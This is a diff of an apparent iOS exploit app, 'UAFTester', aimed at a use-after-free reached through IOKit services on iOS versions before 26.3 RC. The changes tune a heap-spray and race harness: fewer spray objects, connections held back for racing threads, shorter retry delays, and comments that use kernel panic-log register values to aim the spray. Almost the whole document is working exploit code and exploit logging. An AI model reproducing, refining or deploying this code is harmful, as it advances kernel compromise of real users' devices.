@@ -2,9 +2,8 @@
 //  ViewController.m
 //  UAFTester
 //
-//  v8 AGGRESSIVE - Enhanced heap spray to ensure UAF slot coverage
-//  Based on panic log analysis: x16=0x0020... (missed our fake objects)
-//  Solution: 800 objects + double spray + better timing
+//  v8.2 AGGRESSIVE - CRITICAL FIX: Connection Reservation
+//  Fix: Reserve connections for run_attempt() BEFORE spraying
 //
 
 #import "ViewController.h"
@@ -18,11 +17,11 @@
 #define MAX_ATTEMPTS 2000
 
 // ========== AGGRESSIVE HEAP SPRAY CONFIGURATION ==========
-#define SPRAY_COUNT         800      // 4x increase for better coverage
-#define SPRAY_BUFFER_SIZE   512      // Size of fake object (bytes)
-#define SPRAY_DELAY_MS      150      // Slightly longer to let heap settle
+#define SPRAY_COUNT         700      // REDUCED to reserve ~100 for racing!
+#define SPRAY_BUFFER_SIZE   512      
+#define SPRAY_DELAY_MS      150      
 #define SPRAY_RETRY_ON_FAIL 1        
-#define USE_DOUBLE_SPRAY    1        // Spray BEFORE and AFTER UAF trigger
+#define USE_DOUBLE_SPRAY    1        
 // ========================================================
 
 static atomic_int   g_phase  = 0;
@@ -85,7 +84,8 @@ static int heap_spray_init(io_service_t svc, void(^log_callback)(NSString *), in
         
         if (kr != KERN_SUCCESS) {
             if (kr == 0xe00002c7) { // kIOReturnNoResources
-                log_callback([NSString stringWithFormat:@"[SPRAY R%d] Resource limit at %d (expected)", round, i]);
+                log_callback([NSString stringWithFormat:@"[SPRAY R%d] Resource limit at %d (reserved ~%d for racing)", 
+                             round, i, 800-i]);
                 *count = i;
                 break;
             } else {
@@ -250,7 +250,7 @@ static int run_attempt(void) {
     [self.view addSubview:title];
 
     UILabel *subtitle = [[UILabel alloc] init];
-    subtitle.text = [NSString stringWithFormat:@"v8 AGGRESSIVE: %d spray + Double Round\niOS <26.3 RC", SPRAY_COUNT];
+    subtitle.text = [NSString stringWithFormat:@"v8.2 FIX: %d spray (reserved for racing)\niOS <26.3 RC", SPRAY_COUNT];
     subtitle.font = [UIFont fontWithName:@"Menlo" size:12];
     subtitle.textColor = [UIColor colorWithWhite:0.5 alpha:1.0];
     subtitle.textAlignment = NSTextAlignmentCenter;
@@ -329,12 +329,10 @@ static int run_attempt(void) {
     self.triggerButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1.0];
 
     [self appendLog:@"========================================"];
-    [self appendLog:@"  UAF v8 AGGRESSIVE - Double Spray"];
+    [self appendLog:@"  UAF v8.2 - CRITICAL FIX"];
     [self appendLog:@"========================================"];
-    [self appendLog:@"[*] Strategy: 800 objects + 2 rounds"];
-    [self appendLog:@"[*] Based on panic analysis: x16=0x0020..."];
-    [self appendLog:@"[*] Goal: Hit UAF slot with fake objects!"];
-    [self appendLog:[NSString stringWithFormat:@"[*] Spray count: %d per round", SPRAY_COUNT]];
+    [self appendLog:@"[*] FIX: Reserve connections for racing!"];
+    [self appendLog:@"[*] Spray: 700 objects (saves ~100 for racing)"];
     [self appendLog:[NSString stringWithFormat:@"[*] Max attempts: %d (racers: %d)", MAX_ATTEMPTS, NUM_RACERS]];
     [self appendLog:@""];
     [self setStatus:@"Initializing..." color:UIColor.yellowColor];
@@ -369,16 +367,23 @@ static int run_attempt(void) {
         }
         
         [self appendLog:[NSString stringWithFormat:@"[+] Round 1 OK: %d objects active", g_spray_count]];
+        [self appendLog:[NSString stringWithFormat:@"[+] Reserved ~%d connections for racing", 800 - g_spray_count]];
         [self appendLog:@""];
         
         // ========== PHASE 2: FIRST UAF TRIGGER (Creates free slot) ==========
-        [self appendLog:@">>> PHASE 2: TRIGGER UAF (Create free slot)"];
-        [self setStatus:@"Triggering UAF..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
+        [self appendLog:@">>> PHASE 2: TRIGGER UAF (Create free slots)"];
+        [self appendLog:@"[*] Running 5 attempts with reserved connections..."];
+        [self setStatus:@"Creating freed slots..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
         
         // Run a few attempts to create freed slots
-        for (int i = 0; i < 10; i++) {
+        for (int i = 0; i < 5; i++) {
             run_attempt();
-            usleep(5000);
+            usleep(2000);
+            
+            if ((i + 1) % 2 == 0) {
+                [self appendLog:[NSString stringWithFormat:@"[Phase 2] Attempt %d/5: calls=%u errors=%u",
+                                i + 1, atomic_load(&g_calls), atomic_load(&g_errors)]];
+            }
         }
         
         [self appendLog:[NSString stringWithFormat:@"[+] Initial trigger: calls=%u errors=%u", 
@@ -396,7 +401,7 @@ static int run_attempt(void) {
         }, 2);
         
         if (spray_result < 0) {
-            [self appendLog:@"[-] Round 2 spray failed (expected - may be out of resources)"];
+            [self appendLog:@"[-] Round 2 spray failed (may be out of resources - OK!)"];
         } else {
             [self appendLog:[NSString stringWithFormat:@"[+] Round 2 OK: %d objects active", g_spray_count_round2]];
         }
@@ -409,12 +414,18 @@ static int run_attempt(void) {
         [self appendLog:@">>> PHASE 4: MAIN UAF TRIGGER"];
         [self appendLog:[NSString stringWithFormat:@"[*] Total spray coverage: %d objects", 
                         g_spray_count + g_spray_count_round2]];
+        [self appendLog:@"[*] Racing with reserved connections..."];
         [self setStatus:@"Racing UAF..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
 
         for (int i = 0; i < MAX_ATTEMPTS; i++) {
-            if (run_attempt() < 0)
-                usleep(50000);
-            usleep(1000);
+            int result = run_attempt();
+            
+            // CRITICAL: Don't sleep if successful, only on failure
+            if (result < 0) {
+                usleep(10000); // 10ms on failure (much less than 50ms!)
+            }
+            
+            usleep(1000); // Normal 1ms delay
 
             if ((i + 1) % 50 == 0 || i == 0) {
                 [self appendLog:[NSString stringWithFormat:@"[%4d] calls=%u port_dead=%u",
